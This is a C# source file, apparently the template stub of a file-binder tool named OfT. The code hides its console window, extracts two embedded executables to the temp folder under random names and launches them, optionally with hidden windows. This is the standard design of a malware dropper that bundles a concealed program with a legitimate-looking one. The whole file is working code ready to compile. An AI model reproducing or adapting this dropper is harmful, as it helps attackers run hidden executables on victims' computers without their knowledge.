//Compiled by OfT : github.com/dotAaron/OfT



using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace OfT
{

    static class OfTAppCode
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main()
        {
            //F1:_FILEONE_|
            //F2:_FILETWO_|
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            string tempFolder = Path.GetTempPath() + "/";
            Random rnd = new Random();
            string F1 = rnd.Next(6000, 10000) + Path.GetExtension("_FILEONE_");
            string F2 = rnd.Next(0, 5000) + Path.GetExtension("_FILETWO_");

            string F1Hidden = "_F1HIDDEN_";
            string F2Hidden = "_F2HIDDEN_";

            StartApp("_FILEONE_", tempFolder, F1, F1Hidden);
            StartApp("_FILETWO_", tempFolder, F2, F2Hidden);
        }

        static void StartApp(string appName, string tempFolder, string FRnd, string isHidden)
        {
            var assembly = Assembly.GetExecutingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(appName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(tempFolder + FRnd, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));

            Process p = new Process();
            p.StartInfo.FileName = tempFolder + FRnd;

            if(isHidden == "false") { p.StartInfo.WindowStyle = ProcessWindowStyle.Normal; }
            if(isHidden == "true") { p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; }

            p.Start();
        }

    }
}
